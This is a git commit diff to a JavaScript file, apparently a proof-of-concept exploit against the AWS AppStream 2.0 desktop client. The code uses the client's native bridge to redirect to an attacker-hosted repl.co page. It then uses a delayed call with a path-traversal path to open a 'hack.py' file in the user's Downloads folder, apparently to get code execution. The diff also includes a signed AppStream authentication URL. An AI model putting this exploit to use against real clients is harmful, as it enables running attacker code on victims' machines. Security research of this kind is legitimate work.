5a2fae2b25ebdbf05bb71158574495872c92e234
Rakesh Mane <rakeshmane12345@gmail.com>
2020-07-09 22:28:03 +0530

    Update tmp1.js

--- tmp1.js
+++ tmp1.js
@@ -3,16 +3,12 @@
         .then((result) => {
           if(window.as2NativeClient) {
                   
-            if (window.location.hash!="download_completed")
-            {
+  
                    window.as2NativeClient.redirectToHomeWithUrl("https://disloyalmemorableboards.rakeshmane.repl.co/");
-                   window.location.hash="download_completed"
-                   window.location.href="https://appstream2.us-east-1.aws.amazon.com/authenticate?parameters=eyJ0eXBlIjoiRU5EX1VTRVIiLCJleHBpcmVzIjoiMTU5NDkxNjY0MCIsImF3c0FjY291bnRJZCI6IjU5NzI5OTEzNjAxMCIsInVzZXJJZCI6ImFhYWEiLCJjYXRhbG9nU291cmNlIjoic3RhY2svbmV3LXN0YWNrLWV4cGVyaW1lbnQiLCJmbGVldFJlZiI6ImZsZWV0L2ZsZWV0LW9uLWRlbWFuZC1leHBlcmltZW50IiwiYXBwbGljYXRpb25JZCI6IiIsInVzZXJDb250ZXh0IjoiIiwibWF4VXNlckR1cmF0aW9uSW5TZWNzIjoiNTc2MDAifQ%3D%3D&signature=fnGY3chpn8jBG%2BQ3U1e6DHiKgAbahEVHsiqd58V9x%2FM%3D"
-            }
-                 else{
-                         window.as2NativeClient.redirectToHomeWithUrl("..\\..\\..\\..\\Downloads\\hack.py")   
+
+                   setTimeout('window.as2NativeClient.redirectToHomeWithUrl("..\\\\..\\\\..\\\\..\\\\Downloads\\\\hack.py");alert();',3000)   
                  
-                 }
+                 
 
                   // C:\Users\rakesh\AppData\Local\AppStreamClient\app-1.1.160>dir .\..\..\..\..\Downloads
            
